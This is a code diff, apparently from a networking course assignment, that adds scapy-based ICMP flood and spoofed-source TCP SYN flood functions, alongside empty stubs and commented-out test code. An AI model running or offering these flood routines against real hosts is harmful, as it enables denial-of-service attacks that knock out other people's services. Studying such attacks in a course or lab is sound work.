@@ -5,6 +5,7 @@ import time
 import threading
 from jobcreator import JobCreatorNode
 import random
+from scapy.all import *
 
 def new_client(server_address, client_id):
 
@@ -56,6 +57,46 @@ def new_client(server_address, client_id):
 #end new_client
 
 
+"""
+A3. Q1. #1
+"""
+
+def detect_online():
+    pass
+
+"""
+A3. Q1. #2
+"""
+
+def detect_status():
+    pass
+
+
+
+"""
+A3. Q2. #1
+"""
+#crafts and sents ICMP packets num amount of times
+def icmp_flood(des_addr, num):
+    for x in range (0,num):
+        packet = IP(dst=des_addr)/ICMP()
+        send(packet)
+#end icmp_flood
+
+"""
+A3. Q2. #2
+"""
+#crafts and sends a tcp syn packet to specified address num amount of times
+def tcp_flood(des_addr, src_port, des_port, num):
+    for i in range(0, num):
+	packet = IP(src=RandIP(), dst=des_addr)/TCP(sport=src_port, dport=des_port, seq=696969, flags="S")
+	send(packet)
+
+#end tcp_flood
+
+
+#testing  
+"""
 num_of_clients = int(input("How many clients? >"))
 
 server_node = JobCreatorNode()
@@ -66,3 +107,8 @@ server_thread.start()
 for i in range(0,num_of_clients):
     new_client_thread = threading.Thread(target=new_client, args=(server_node.getAddress(), i+1, ))
     new_client_thread.start()
+
+"""
+
+
+
